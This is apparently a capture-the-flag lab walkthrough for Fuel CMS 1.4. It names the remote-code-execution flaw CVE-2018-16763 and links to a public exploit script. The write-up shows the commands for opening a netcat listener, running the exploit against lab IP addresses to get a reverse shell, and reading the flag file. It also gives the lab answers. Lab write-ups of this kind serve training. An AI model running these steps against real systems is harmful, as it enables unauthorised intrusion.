`Fuel CMS`
- What is the version number of this application? `1.4`
- What is the number of the CVE that allows an attacker to remotely execute code on this application? <br />
Found the answer [here](https://github.com/ice-wzl/Fuel-1.4.1-RCE-Updated/blob/main/Fuel-Updated.py); the RCE script is in the exploit.py file. `CVE-2018-16763`
- Use the resources & skills learnt throughout this module to find and use a relevant exploit to exploit this vulnerability. <br />
Copy the exploit file (remember to make it executable, `chmod +x exploit.py`). As we can see from the image below, the script requires to set three arguments: the url, the IP of our attackbox and the listening port on our attackbox. <br />

So open a netcat listener on your machine: `nc -lnvp 4444`, and the command looks like this: `python3 exploit.py http://10.10.196.75 10.11.85.53 4444`<br />

And we have remote code execution.

- What is the value of the flag located on this vulnerable machine? This is located in /home/ubuntu on the vulnerable machine. <br />
Run `cat /home/ubuntu/flag.txt`<br />
